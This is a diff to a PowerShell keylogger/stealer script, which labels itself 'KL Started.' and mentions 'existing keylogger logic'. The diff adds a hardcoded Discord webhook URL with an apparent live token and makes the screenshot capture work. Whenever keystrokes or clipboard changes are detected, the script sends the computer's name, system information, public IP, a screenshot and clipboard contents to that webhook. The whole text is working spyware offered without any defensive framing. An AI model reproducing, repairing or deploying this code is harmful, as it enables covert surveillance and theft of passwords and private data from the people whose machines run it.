@@ -1,3 +1,6 @@
+# Define the webhook URL
+$dc = 'https://discord.com/api/webhooks/1275636071421448254/yfVS5vYWNKMHnPvEKgRnB95EZ84MXzfoVxoY5ytgNLW6k_DKx3tCmP6nMvR22G-p6uZW'
+
 # Function to get system information
 function Get-SystemInfo {
     $sysinfo = @{
@@ -17,6 +20,7 @@ function Get-PublicIP {
         $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
         return $response.ip
     } catch {
+        Write-Output "Error retrieving public IP address: $_"
         return "Unable to retrieve IP"
     }
 }
@@ -24,6 +28,7 @@ function Get-PublicIP {
 # Function to capture a screenshot
 function Capture-Screenshot {
     Add-Type -AssemblyName System.Drawing
+    Add-Type -AssemblyName System.Windows.Forms
     $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
     $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
@@ -41,14 +46,15 @@ function Get-ClipboardContent {
 
 # Function to send data to Discord webhook
 function Send-DiscordWebhook {
-    $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-    $systemInfo = Get-SystemInfo
-    $publicIP = Get-PublicIP
-    $screenshotBytes = Capture-Screenshot
-    $screenshotBase64 = [Convert]::ToBase64String($screenshotBytes)
-    $clipboardContent = Get-ClipboardContent
+    try {
+        $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+        $systemInfo = Get-SystemInfo
+        $publicIP = Get-PublicIP
+        $screenshotBytes = Capture-Screenshot
+        $screenshotBase64 = [Convert]::ToBase64String($screenshotBytes)
+        $clipboardContent = Get-ClipboardContent
 
-    $content = @"
+        $content = @"
 **KL Started.**
 
 **PC Information**
@@ -65,19 +71,34 @@ function Send-DiscordWebhook {
 $clipboardContent
 "@
 
-    $jsonsys = @{
-        "username" = "$env:COMPUTERNAME"
-        "content" = $content
-        "screenshot" = $screenshotBase64
-    } | ConvertTo-Json
+        $jsonsys = @{
+            "username" = "$env:COMPUTERNAME"
+            "content" = $content
+            "embeds" = @(
+                @{
+                    "title" = "Screenshot"
+                    "image" = @{
+                        "url" = "data:image/png;base64,$screenshotBase64"
+                    }
+                }
+            )
+        } | ConvertTo-Json -Depth 10
 
-    Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
+        # Log the content being sent
+        Write-Output "Sending data to Discord webhook..."
+        Write-Output $jsonsys
+
+        Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
+    } catch {
+        Write-Output "Error sending data to Discord webhook: $_"
+    }
 }
 
 # Main loop for keypress detection (this should be integrated with your existing keylogger logic)
 While ($true) {
     # Assuming $send contains the keystrokes captured
     if ($send -or $clipboardContent) {
+        Write-Output "Detected keypress or clipboard change."
         Send-DiscordWebhook
         $send = ""
     }
